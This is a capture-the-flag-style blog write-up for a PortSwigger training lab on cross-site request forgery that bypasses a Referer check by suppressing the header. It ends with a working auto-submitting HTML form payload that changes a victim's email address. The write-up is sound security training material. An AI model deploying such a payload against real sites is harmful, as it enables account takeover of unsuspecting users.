+++
date = '2026-07-06T13:50:16+08:00'
draft = false
title = "CSRF where Referer validation depends on header being present | <span style=\"color:#3498db\">Practitioner</span>"
tags = ['training', 'PortSwigger', 'writeups', 'web-exploitation']
description = ''
showLastUpdated = true
+++
Before attempting any CSRF payloads, it's good practice to know more about the cookies first to see whether certain restrictions are in place. Fortunately for us, this lab has only one session cookie with `SameSite=None`, without any CSRF token validation. This means any future exploits can be crafted and sent without problems:
![](/images/viber_image_2026-07-06_13-43-55-517.png)
![](/images/viber_image_2026-07-06_13-44-23-825.png)

Let's try sending the email changing request to Repeater. As the lab's name suggests, let's tinker a little with the Referer header. As you can see above, the Referer header is pointing to the main site in which the backend accepts and forwards our request. How about changing that header to something else instead?
![](/images/viber_image_2026-07-06_13-46-22-255.png)

We got a 400. This confirms our suspicion that the web application routinely checks for valid Referer headers before accepting requests from us. How about removing that header entirely?
![](/images/viber_image_2026-07-06_13-46-51-117.png)
This works! The backend never bothers to check missing headers, and we got a 302 to `my-account` with the newly changed email. With all these information, let's craft the payload:
```html
<html>
<meta name="referrer" content="never">
<body>

<form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST" id="attack">
<input type="hidden" name="email" value="attacker@snail">
</form>

<img src=1 onerror="document.getElementById('attack').submit()">

</body>
</html>
```